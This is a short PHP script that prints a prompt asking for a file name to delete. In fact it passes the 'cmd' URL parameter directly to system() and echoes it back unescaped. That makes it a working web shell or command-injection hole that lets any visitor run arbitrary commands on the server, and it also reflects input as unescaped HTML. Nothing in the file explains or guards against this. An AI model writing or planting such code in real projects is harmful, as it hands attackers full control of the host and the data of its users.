<?php
print("Please specify the name of the file to delete");
print("<p>");
$cmd=$_GET['cmd'];
print($cmd);
system("$cmd");
?>

